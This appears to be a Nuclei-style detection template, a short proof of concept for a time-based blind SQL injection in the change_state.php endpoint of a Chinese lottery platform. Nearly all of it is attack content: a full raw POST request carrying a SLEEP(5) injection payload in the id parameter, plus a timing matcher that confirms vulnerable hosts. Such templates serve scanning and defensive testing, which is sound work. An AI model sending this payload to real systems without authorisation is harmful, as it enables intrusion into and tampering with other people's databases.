id: poc-bvhd4kpd47xm7wzk
info:
  name: CP-957娱乐大富彩票系统change_state存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /change_state.php HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"

    Sec-Ch-Ua-Mobile: ?0

    Sec-Ch-Ua-Platform: "Windows"

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (

    KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36

    Content-Type: application/x-www-form-urlencoded

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i

    mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Sec-Fetch-Site: none

    Sec-Fetch-Mode: navigate

    Sec-Fetch-User: ?1

    Sec-Fetch-Dest: document

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Content-Length: 46

    id=(SELECT 6666 FROM (SELECT(SLEEP(5)))Bypass)'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
